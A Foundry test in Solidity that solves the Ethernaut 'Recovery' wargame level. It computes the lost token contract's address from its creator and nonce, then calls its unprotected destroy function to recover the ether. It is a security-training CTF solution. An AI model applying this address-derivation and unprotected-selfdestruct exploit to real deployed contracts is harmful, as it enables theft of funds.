// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/17-Recovery/RecoveryFactory.sol";
import "../src/Ethernaut.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testRecoveryHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        RecoveryFactory factory = new RecoveryFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // Recovery level = Recovery(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        address _simpleTokenAddr = address(uint160(uint256(keccak256(abi.encodePacked(hex'd694', levelAddress, hex'01')))));
        SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
        _simpleToken.destroy(payable(eoaAddress));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}